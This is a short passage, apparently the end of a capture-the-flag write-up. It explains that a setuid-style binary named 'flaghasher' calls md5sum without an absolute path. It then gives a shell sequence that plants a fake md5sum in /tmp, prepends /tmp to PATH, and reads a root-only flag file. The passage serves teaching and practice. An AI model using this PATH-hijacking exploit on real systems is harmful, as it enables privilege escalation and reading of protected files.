> If we inspect the binary using R2, we see that the binary runs the md5sum command without an absolute filepath, so we can perform path hijacking to have the binary run an md5sum binary with arbitrary code

```
echo 'cat /root/flag.txt > /tmp/flag.txt && chmod 777 /tmp/flag.txt' > /tmp/md5sum
export PATH=/tmp:$PATH
chmod 777 /tmp/md5sum
./flaghasher
cat /tmp/flag.txt
```

Finis
